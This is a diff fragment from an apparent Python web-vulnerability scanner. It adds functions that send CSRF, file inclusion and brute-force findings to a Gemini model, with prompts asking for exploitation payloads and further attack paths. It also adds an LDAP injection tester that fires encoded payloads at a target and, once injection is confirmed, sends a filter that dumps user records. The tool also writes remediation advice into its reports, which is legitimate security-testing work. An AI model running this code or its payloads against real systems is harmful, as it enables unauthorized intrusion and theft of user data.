+                print(f"{Fore.GREEN}[+] AI Assistant Analysis for CSRF:\n{ai_response}{Style.RESET_ALL}")
+                save_output(output_dir, "ai_csrf_analysis.txt", ai_response)
+                return ai_response
+            except Exception as e:
+                print(f"{Fore.RED}[-] AI Assistant Error for CSRF: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
+
+        async def ai_assist_file_inclusion(target, output_dir, findings):
+            print(f"{Fore.CYAN}[*] AI Assistant analyzing File Inclusion findings for {target}...{Style.RESET_ALL}")
+            prompt = f"Analyze the following File Inclusion (LFI/RFI) findings for target {target}. Explain the potential impact (e.g., sensitive file disclosure, RCE) and suggest remediation steps. Provide specific payloads or techniques for further exploitation.\n\nFile Inclusion Findings:\n"
+            for finding in findings:
+                prompt += f"- {finding}\n"
+            try:
+                response = await GEMINI_MODEL.generate_content_async(prompt)
+                ai_response = response.text
+                print(f"{Fore.GREEN}[+] AI Assistant Analysis for File Inclusion:\n{ai_response}{Style.RESET_ALL}")
+                save_output(output_dir, "ai_file_inclusion_analysis.txt", ai_response)
+                return ai_response
+            except Exception as e:
+                print(f"{Fore.RED}[-] AI Assistant Error for File Inclusion: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
+
+        async def ai_assist_brute_force_login(target, output_dir, findings):
+            print(f"{Fore.CYAN}[*] AI Assistant analyzing Brute Force Login findings for {target}...{Style.RESET_ALL}")
+            prompt = f"Analyze the following Brute Force Login findings for target {target}. Summarize any successful credential compromises or weak login mechanisms. Suggest remediation steps (e.g., rate limiting, CAPTCHA, MFA) and further exploitation paths.\n\nBrute Force Login Findings:\n"
+            for finding in findings:
+                prompt += f"- {finding}\n"
+            try:
+                response = await GEMINI_MODEL.generate_content_async(prompt)
+                ai_response = response.text
+                print(f"{Fore.GREEN}[+] AI Assistant Analysis for Brute Force Login:\n{ai_response}{Style.RESET_ALL}")
+                save_output(output_dir, "ai_brute_force_login_analysis.txt", ai_response)
+                return ai_response
+            except Exception as e:
+                print(f"{Fore.RED}[-] AI Assistant Error for Brute Force Login: {e}{Style.RESET_ALL}")
+                return f"AI Assistant Error: {e}"
+
+        async def test_single_ldap_payload(point, payload):
+            for encoded_p in get_encoded_payloads(payload):
+                test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + encoded_p, point['form_data'], point['original_query'])
+                res, request_details, response_details = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+
+                if res and await res.text() and any(e in (await res.text()).lower() for e in ldap_errors):
+                    output.print(f"  [CRITICAL] Error-Based LDAP Injection confirmed in {point['method'].upper()} param '{point['param']}' with payload: {encoded_p}")
+                    evidence = f"Vulnerable URL: {test_url}\nPayload: {encoded_p}\n\n--- Response Snippet (Error Message) ---\n{(await res.text())[:400]}\n---"
+                    
+                    dump_payload = "(&(objectClass=*)(uid=*))"
+                    dump_url, dump_data = build_request(point['url'], point['method'], point['param'], point['value'] + dump_payload, point['form_data'], point['original_query'])
+                    res_dump, _, _ = await _send_async_http_request(dump_url, method=point['method'], data=dump_data, output=output, session_cookies=session_cookies)
+                    if res_dump and await res_dump.text() and not any(e in (await res_dump.text()).lower() for e in ldap_errors):
+                        evidence += f"\n\n--- Post-Exploitation (User Dump Attempt) ---\nPayload: {dump_payload}\nResponse Snippet:\n{(await res_dump.text())[:500]}\n---"
+                        output.print(f"    [SUCCESS] Post-exploitation payload sent. Response may contain user data.")
+
+                    report.add_finding("LDAP Injection", "Critical", point['url'], point['param'], encoded_p,
+                                       "The application is vulnerable to LDAP Injection, allowing query manipulation.",
+                                       "Use parameterized LDAP queries or a safe query construction library. Sanitize all user input used in LDAP filters.",
+                                       evidence, method=point['method'], request_details=request_details, response_details=response_details)
+                    return True
+            return False
 
     async def run_smart_probe(point):
         output.print(f"  [Phase 1] Running Smart Probe for LDAP Injection on param '{point['param']}'...")
